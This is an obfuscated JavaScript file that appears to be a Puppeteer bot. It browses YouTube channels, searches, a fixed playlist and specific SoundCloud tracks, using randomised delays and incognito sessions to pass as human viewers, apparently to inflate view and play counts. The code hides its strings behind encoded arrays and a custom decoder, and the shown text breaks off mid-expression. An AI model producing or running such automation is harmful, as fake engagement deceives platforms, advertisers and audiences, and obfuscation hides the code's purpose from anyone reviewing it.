const V = d,
  U = b,
  S = c;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x332 * -0xc + -0x4fe + -0x215a);
    let h = e[f];
    return h;
  }, d(b, c);
}

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x87a + 0xc7d + -0xa7b * 0x2))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x1 * -0x5c0 + -0x196a * -0x1 + -0x1f2a), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x332 * -0xc + -0x4fe + -0x215a);
    let h = e[f];
    if (c['iFUXmt'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x2b7 * -0x9 + 0x2445 + -0x3cb4, r, s, t = -0x1f03 + 0x12a3 + -0x60 * -0x21; s = m['charAt'](t++); ~s && (r = q % (0x87a + 0xc7d + -0xad * 0x1f) ? r * (-0x1 * -0x5c0 + -0x196a * -0x1 + -0x1eea) + s : s, q++ % (-0x1 * 0xf32 + -0x115b + -0xadb * -0x3)) ? o += String['fromCharCode'](-0x4a * 0x11 + 0x1b9 + -0x10c * -0x4 & r >> (-(0x933 + 0x6b * 0x46 + 0x2673 * -0x1) * q & 0x11 * 0x11 + 0x180b + -0x1926)) : 0x2278 + -0x73f * -0x1 + -0xb5 * 0x3b) {
          s = n['indexOf'](s);
        }
        for (let u = 0xcfc * -0x2 + 0x1 * 0x1232 + 0x7c6, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x653 + -0x1a40 + 0x22d * 0xf))['slice'](-(-0x1e63 + -0x22 * -0x11e + -0x43 * 0x1d));
        }
        return decodeURIComponent(p);
      };
      c['ksnzhE'] = i, b = arguments, c['iFUXmt'] = !![];
    }
    const j = e[-0x6d1 * 0x2 + -0x1855 + 0x25f7],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ksnzhE'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * 0x5b29 + -0x6823 + -0x9c3e * -0x2 + (-0x2f3 * 0x5 + 0x52c + -0x793 * -0x9) * random()) : await standardWaitForNetIdle(f), await wait(0x933 + 0x6b * 0x46 + 0x12ed * -0x1 + (0x11 * 0x22 + 0x3015 + -0xb47) * random()), 0x2278 + -0x73f * -0x1 + -0x232 * 0x13;
}
async function standardWaitForNetIdle(f) {
  return await wait(0xcfc * -0x2 + 0x1 * 0x1232 + 0x1b4e), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x653 + -0x1a40 + 0x1a1 * 0x14;
}
async function randomWait() {
  return await wait(-0x1e63 + -0x22 * -0x11e + -0xeb * -0xd + (-0x6d1 * 0x2 + -0x1855 + 0x397f) * random()), 0x24ac * 0x1 + 0x145e + 0x1 * -0x3909;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x4 * 0x166 + 0x2366 + -0x28fe, -0x8 * 0x328 + -0x388 + -0x127 * -0x19), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x8e88 + -0xacb0 + 0x8444 * 0x2) * getRandomInt(0x2 * 0x1283 + -0x129c + 0x4c * -0x3e, 0x1 * -0x1b83 + -0x6f + 0x1bf7), h)), 0xce5 + -0x7f4 + -0x4f0;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = 0xe87 * 0x1 + -0x634 + -0x853 * 0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1088 + -0x93e + 0x19c7]['split']('\x20');
    for (let k = -0x2506 + -0xfb1 + 0x34b7; k < i['length']; k += 0x2600 + 0xed * -0x3 + -0x2337)
      j += i[k] * h[i[k + (0x13 * -0x137 + 0x25a3 + 0x5 * -0x2e9)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2211 + 0x78a + -0x2995)['map'](l => Array['from'](l['children']))['flat'](-0x155 * 0x9 + 0x8ac + 0x5 * 0xaa)['map'](l => l['childNodes'][0x2 * 0x15d + 0x1855 + -0x1b0e]['childNodes'][-0x1c8 * -0x12 + -0x6cd * -0x1 + 0x26dd * -0x1]['childNodes'][0x1cea + 0xb12 + 0x17 * -0x1bd]['childNodes'][0x1 * -0x2393 + 0x1 * 0xd05 + 0x168e]['childNodes'][0x72 + -0xaf1 + 0x1c0 * 0x6]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x11da + 0xa * -0x137 + 0x21e8, 0x13d5 + 0xa3 * 0x17 + -0x1 * 0xef2)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x181e + -0x1 * 0x27b2 + 0x7a68);
  const h = await getMaxTime(f),
    i = Math['min']((0x179e2 + -0x1cdcc + 0x13e4a * 0x1) * getRandomInt(0x1 * -0x57 + -0x3 * -0xa7 + 0x4 * -0x67, -0x1976 * -0x1 + -0x8ec + 0x1085 * -0x1), h);
  return await wait(i), -0x1 * 0x10c9 + 0x1633 + 0x115 * -0x5;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x332 * -0xc + -0x4fe + -0x215a);
    let h = e[f];
    if (b['SgkuvO'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x2b7 * -0x9 + 0x2445 + -0x3cb4, s, t, u = -0x1f03 + 0x12a3 + -0x60 * -0x21; t = n['charAt'](u++); ~t && (s = r % (0x87a + 0xc7d + -0xad * 0x1f) ? s * (-0x1 * -0x5c0 + -0x196a * -0x1 + -0x1eea) + t : t, r++ % (-0x1 * 0xf32 + -0x115b + -0xadb * -0x3)) ? p += String['fromCharCode'](-0x4a * 0x11 + 0x1b9 + -0x10c * -0x4 & s >> (-(0x933 + 0x6b * 0x46 + 0x2673 * -0x1) * r & 0x11 * 0x11 + 0x180b + -0x1926)) : 0x2278 + -0x73f * -0x1 + -0xb5 * 0x3b) {
          t = o['indexOf'](t);
        }
        for (let v = 0xcfc * -0x2 + 0x1 * 0x1232 + 0x7c6, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x653 + -0x1a40 + 0x22d * 0xf))['slice'](-(-0x1e63 + -0x22 * -0x11e + -0x43 * 0x1d));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x6d1 * 0x2 + -0x1855 + 0x25f7,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x24ac * 0x1 + 0x145e + 0x1 * -0x390a; u < 0x4 * 0x166 + 0x2366 + -0x27fe; u++) {
          p[u] = u;
        }
        for (u = -0x8 * 0x328 + -0x388 + -0x4cc * -0x6; u < 0xbe1 + -0xe64 + 0x383 * 0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x2 * 0x1283 + -0x129c + 0x2e7 * -0x6), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0x1b83 + -0x6f + 0x1bf2, q = 0xce5 + -0x7f4 + -0x4f1;
        for (let v = 0xe87 * 0x1 + -0x634 + -0x853 * 0x1; v < n['length']; v++) {
          u = (u + (-0x1088 + -0x93e + 0x19c7)) % (-0x2506 + -0xfb1 + 0x35b7), q = (q + p[u]) % (0x2600 + 0xed * -0x3 + -0x2239), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x13 * -0x137 + 0x25a3 + 0x5 * -0x2b6)]);
        }
        return t;
      };
      b['gWhLDJ'] = m, c = arguments, b['SgkuvO'] = !![];
    }
    const j = e[0x2211 + 0x78a + -0x299b],
      k = f + j,
      l = c[k];
    return !l ? (b['lDVuwg'] === undefined && (b['lDVuwg'] = !![]), h = b['gWhLDJ'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0x13af + 0x2 * 0x281 + 0x11 * 0xdd]['children'][0xd6f + 0xd07 + -0x1a76]['children'][0x58c * -0x7 + -0x1f3f + 0x4613]['children'][0x67f + -0x19f6 * 0x1 + 0x1377]['children'][-0x4 * 0x31d + -0x40 * 0x7b + 0x316 * 0xe]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x1e5a + 0x1 * -0x477 + 0xcf1 * -0x2;
}
async function searchAndView(f) {
  const R = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x1 * 0x6d1 + -0x3 * 0x9b3 + 0x1227 * 0x2 + (0x47 * -0x6f + 0xc74 * 0x1 + 0x1287) * random()
  }), await wait(-0x5 * 0xf1 + 0xfd1 + -0x1 * 0x928 + (-0x1 * -0xd45 + -0xe83 * 0x1 + 0x2 * 0x135) * random()), await f['click']('#search-ic' + R(0x0)), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0xa7f * -0x3 + -0x3 * -0x893 + 0x4 * -0xe4d]['childNodes'][0x23 * -0x53 + -0x1d36 * -0x1 + 0xc * -0x17d]['childNodes'][-0x1 * -0x1c2d + 0x14f6 + -0x3122]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x627 + 0x12d6 + -0x4 * 0x63e]['childNodes'][0xeb6 + 0xf9a + 0x4 * -0x794]['childNodes'][-0x14 * -0x62 + -0x10 * -0x54 + 0xfe * -0xd]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x2577 + -0x1788 + -0x6f7 * 0x2),
          r = 0xe34 + 0x1eb0 + -0x2ce4;
        for (let u = 0x3 * 0x8 + -0x2 * -0x12a5 + -0x2562; u < q['length']; u += 0xaf * 0x6 + 0xc51 * 0x3 + -0x13 * 0x229)
          r += q[u] * k[q[u + (0x1 * 0xb0f + 0x1bfa + -0x2708)]];
        return r;
      }(n);
  });
  await wait((0x1d32 + -0x1459 + -0xf * -0x351) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x16b5 + -0x7751 + 0x14afc) * getRandomInt(0x22c2 + -0x4f5 + -0x1dcc, -0x1482 + -0x56a + 0x19f6), h + (-0x11b * -0x11 + 0x975 + -0x45c * 0x2));
  return await wait(i), -0x1ecf + 0x122 + 0x1 * 0x1dae;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1625 + -0xe7d + -0x7a8), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0xcd * -0x5 + 0xcc7 + -0x510 + (0x1 * 0xa47 + -0x26da + -0x67f * -0x5) * Math['random']());
    });
  }, 0x16 * 0x1e2 + 0x6a3 + -0x14b7);
  await wait(0x17bd1 * 0x1 + 0x3 * -0x59b + 0x328e0);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x265b + -0x1 * -0x12f49 + -0x1 * 0x1e8e) * getRandomInt(0x132d + 0x250a + 0x1 * -0x3833, 0x1 * 0x1b86 + -0x860 * -0x4 + -0x9 * 0x6c5)), clearInterval(h), -0xe55 + 0x1a1d + -0xbc7;
}

function a() {
  const bk = [
    'B24TBgvNywn5',
    'cript',
    'PNBJyHEkfk',
    'vlBji8TOax',
    'lxHJBgLLBNqTyG',
    'z2vYlwPZltzJzG',
    'Aw4TywrIBg9JAW',
    'dCkuhCoXh0VcOCk4WPn/',
    'Eu9PuK9MANH6wa',
    'ChvZAa',
    'WQrFFsxdS8oagCk+W69m',
    'z2v0',
    'Slither.io',
    'slice',
    'BmknWOXDfSkmDxTBDa',
    'nsvcqYvcqsvfnW',
    'Ahr0Chm6lY9NCG',
    '6\x20Edg/108.',
    'W47dOCk8',
    '5d668f827a',
    'EgXbru9Rsxv5nW',
    'AwfUlMnVBs8',
    'CMCVzw4VC2nYAq',
    'ls1KAxnHyMXLlq'
  ];
  a = function() {
    return bk;
  };
  return a();
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x14d1 + 0x333 * 0x1 + -0x1804;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0xdbe * 0x2 + 0x2502 * -0x1 + 0x987;
    await randomWait();
  }
  return -0x23ca + 0x248a + 0xbf * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= -0x227f + 0x16fd + 0xb82 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x9f1 + -0x977 + 0x1368 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x1528 + -0x3 * 0x9ab + 0x31 * 0x29 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x255f + -0x2123 * -0x1 + 0x43c;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xbf08 + 0xd7c9 + -0x17 * -0x691 + getRandomInt(-0xa8e * -0x1 + 0x396b * -0x1 + 0x6975, -0x64c * -0x3 + 0x1d * -0x38c + 0xc928));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1c80 + 0x41d * 0x7 + 0x2 * -0x1ca5), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * 0x1efd + -0x10 * -0x1d5 + 0x1 * 0x1ad;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x1973 + -0x1 * -0x256c + -0xbf9, 0x140f * -0x1 + -0x19c + 0x15dd)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xb3d * -0x2 + -0x26ce * -0x1 + 0xec * -0x3a + floor((-0x123 + 0x2 * 0x69b + 0x2b9 * -0x3) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x201090 * 0x71 + -0x70e3122 * 0x1f + -0x8b * -0x2647e6a),
          0x9 * 0xbdec3 + 0xe24048 + -0xcd1523,
          -0xd2f5 + 0x8a33 + 0x1cae * 0x7,
          0x1 * -0xf69 + -0x7a7 + 0x1790
        ], y = [
          0x1da6 + -0x49 * 0x3d + -0xc29,
          0x1cc0 + 0x1192 * -0x1 + -0x58f * 0x2,
          0xaac + 0x2536 + 0x6d6 * -0x7,
          -0x6 * -0xd4 + 0x486 + -0x97e
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1 * 0x7f + -0x1c5 + 0x3 * 0x6d)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x60f + 0x1 * -0xbcc + 0x5bd; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x17f0 + 0x13ce + 0x422) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2b * -0xb + 0x1f4e + 0x17 * -0x171] = A[0xa61 * -0x2 + -0x1690 + 0x2b62] = A[0x1e1b + 0x4 * 0x52 + -0x26a * 0xd] = A[0x1801 + 0x5 * -0x371 + -0x365 * 0x2] = A[-0x144c * 0x1 + 0x693 + 0xc * 0x125] = A[-0x1 * 0xd9f + -0xe3f + 0x2 * 0xdf1] = A[-0x15ed + -0x1cec + 0x32de] = A[0x571 * 0x1 + -0x23 * 0x56 + 0x657] = A[-0x1 * -0x796 + -0x1 * 0x128f + 0x1 * 0xb00] = A[0x240f + -0x389 * -0x4 + -0x3 * 0x10b9] = A[-0x2 * -0x38c + -0x39b * -0x3 + -0x11e0] = A[0x161e + -0x5 * -0x20b + -0x204b] = A[-0x3 * 0x235 + 0x56a + 0x140] = A[0x2332 + 0x11 * -0xe1 + -0x7 * 0x2e3] = A[0x505 * -0x1 + 0x32d + 0x1e5 * 0x1] = A[0x1 * 0x1c85 + -0x20c3 * -0x1 + -0x3d3a] = A[-0x507 + 0xaa7 + 0x39 * -0x19] = 0x25f5 + -0x1be5 + 0x5c * -0x1c, this['blocks'] = A) : this['blocks'] = [
                -0x106d + -0x96 * 0x9 + 0x15b3,
                -0x21d * -0x12 + -0x1 * 0x1bc8 + -0x1a * 0x65,
                0x706 + -0x1a6e * -0x1 + -0x2174,
                0x1bf * -0x16 + -0x1a6 + 0x2810,
                -0x24d * -0xc + -0x107 * -0xa + 0xd * -0x2ea,
                -0x2 * -0x151 + -0x5 * 0x6d + -0x1 * 0x81,
                -0x167b * 0x1 + 0x13 * 0x15b + -0x346,
                -0xd5b + -0x71 * 0x4f + 0x303a,
                -0x516 + -0x5 * -0x214 + 0x1 * -0x54e,
                -0x21c8 + -0x1 * -0x1fca + 0x3 * 0xaa,
                -0x2 * -0xcd7 + -0x994 * -0x4 + -0x3ffe,
                0x1867 + 0x2537 * 0x1 + -0x3d9e,
                0xd6f * -0x2 + -0x360 + 0x1e3e,
                -0x1465 + -0xdc + -0x1541 * -0x1,
                -0x1bb0 + -0x1b2 + 0x1 * 0x1d62,
                -0x1e * -0x4f + 0x1a55 + -0x2397,
                -0xc09 + -0x3 * 0x4ab + 0x21 * 0xca
              ], this['h0'] = 0x58272b37 + -0xbad988ab * -0x1 + -0xabbb90e1, this['h1'] = 0x67554e6a + 0x1bfcb8de1 * -0x1 + 0x24843eb00, this['h2'] = -0x86046d7 + -0x221782 * 0x1ef + -0x35 * -0x44893c7, this['h3'] = 0x38f * -0x1c8b7 + -0xc4b29c * 0x25 + -0xba39 * -0x4613, this['h4'] = 0x8427b2aa + -0x142569b59 + 0x177bba9 * 0x107, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x7a + -0x151a + 0x1594, this['finalized'] = this['hashed'] = -0x7e0 + 0x2545 + -0x1d65, this['first'] = -0x1bf5 + 0x2a9 + 0x194d;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0xc1 * -0x1f + 0x24da + -0x3c39, O = J['length'] || -0x1 * -0x1c4b + -0x109c + -0xbaf, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x258a + 0x66b * 0x1 + 0xb * -0x3ff, P[0x6f * -0x16 + -0x1279 * -0x2 + -0x1b68] = this['block'], P[0x1a1c + 0x1de * 0x12 + -0x3ba8] = P[0x1f * 0x9f + 0x145 + 0x11 * -0x135] = P[0x1 * 0xcaa + -0x163a + -0x5 * -0x1ea] = P[-0xbf2 * -0x2 + 0x1f2a + -0x4d * 0xb7] = P[-0x1 * -0x2356 + -0x1902 + 0x1b8 * -0x6] = P[0x142f * -0x1 + 0x10f1 * 0x1 + -0x1 * -0x343] = P[-0x8db * -0x1 + -0x5 * -0x10f + 0xe2 * -0x10] = P[0x23c2 + -0x5a * 0x19 + 0x13 * -0x16b] = P[0xf96 * -0x1 + -0x8ce + 0x1 * 0x186c] = P[0xa2c + 0xe83 + -0x18a6] = P[0x2c2 * -0x8 + 0x18b9 + -0x29f] = P[0xdbb * 0x1 + 0xa44 + -0x17f4] = P[-0x875 + 0x1a44 + -0x11c3] = P[0x17ea + 0x1 * 0x316 + -0x1af3] = P[0x71a + -0xe94 + 0x788] = P[-0x4b2 * -0x8 + 0x1 * -0x1015 + 0x1 * -0x156c] = -0x218a + -0x5 * 0x4a6 + 0x38c8 * 0x1), K) {
                    for (N = this['start']; M < O && N < -0x1 * -0x1a9b + 0x1166 + 0x17 * -0x1e7; ++M)
                      P[N >> 0x151a + 0x2e5 + -0x17fd] |= J[M] << y[0x19b3 + -0x629 * 0x6 + 0xde * 0xd & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xaef + -0xc15 + 0x1744; ++M)
                      (L = J['charCodeAt'](M)) < 0x1 * 0x77b + -0x1859 + -0x1 * -0x115e ? P[N >> 0x4f * -0x78 + -0x8 * 0x3b3 + -0x1636 * -0x3] |= L << y[0x1a03 * -0x1 + 0x15cd + 0x439 & N++] : L < -0x1a13 + 0x1 * 0x1cf + 0x2044 ? (P[N >> -0x892 + 0x270a + -0x1e76] |= (0x49e * -0x3 + -0x13d1 + 0x226b | L >> -0x8 * 0x443 + -0x1192 + 0x19d8 * 0x2) << y[0x10 * -0x212 + 0x2 * -0xb4a + 0x37b7 & N++], P[N >> 0x1e47 + 0x19 * -0x177 + 0x65a] |= (0x804 + -0xe1 + -0x6a3 | -0x23c4 + -0x1f8b + -0x1 * -0x438e & L) << y[0x47 * -0x20 + -0x74d * -0x2 + -0x4d * 0x13 & N++]) : L < -0x3 * 0x10cf + 0x13e46 + 0xd * -0x3fd || L >= 0x1 * 0xfd62 + 0x1b155 + -0x1ceb7 ? (P[N >> 0x3 * -0x2a6 + -0x2d3 * -0xa + 0x7 * -0x2e6] |= (-0x3 * -0x730 + -0x2156 + 0xca6 * 0x1 | L >> 0x107 * -0xb + -0xe10 + 0x1969) << y[0x3c7 + -0x1b * -0x2e + -0x44f * 0x2 & N++], P[N >> 0x1006 * 0x1 + 0x23c9 + -0x33cd] |= (-0x20 * 0x104 + 0x56b * -0x1 + 0x266b | L >> -0x1 * -0x559 + -0x20f2 + -0x1 * -0x1b9f & -0xba3 * 0x3 + -0x803 + 0x2b2b) << y[0x1c42 + 0x23ed * 0x1 + -0x402c & N++], P[N >> -0x2 * -0x7bb + -0x766 + 0x2 * -0x407] |= (0xb44 + 0x1 * 0x1ef7 + -0x29bb | 0x207 * 0x2 + 0x1 * -0x4be + 0xef & L) << y[0x1efe * -0x1 + 0xc5e + 0x12a3 * 0x1 & N++]) : (L = 0xe792 + 0x1bd9e + 0x8 * -0x34a6 + ((-0x2 * -0xdae + 0x1075 + -0xd46 * 0x3 & L) << -0x9cd * -0x1 + -0x5 * 0xef + -0x1 * 0x518 | 0x26f3 + -0x2f9 * 0x3 + 0x1a09 * -0x1 & J['charCodeAt'](++M)), P[N >> -0x191c + 0x940 + 0x2a5 * 0x6] |= (-0x461 + 0x135a * -0x1 + 0x4ef * 0x5 | L >> 0x223d + -0x1468 * 0x1 + -0xdc3) << y[0x17f * -0x17 + 0x38 * -0x31 + -0x6c * -0x6b & N++], P[N >> -0x4da + 0x679 * 0x4 + 0x1508 * -0x1] |= (0xbb9 + -0x4dd + 0x4 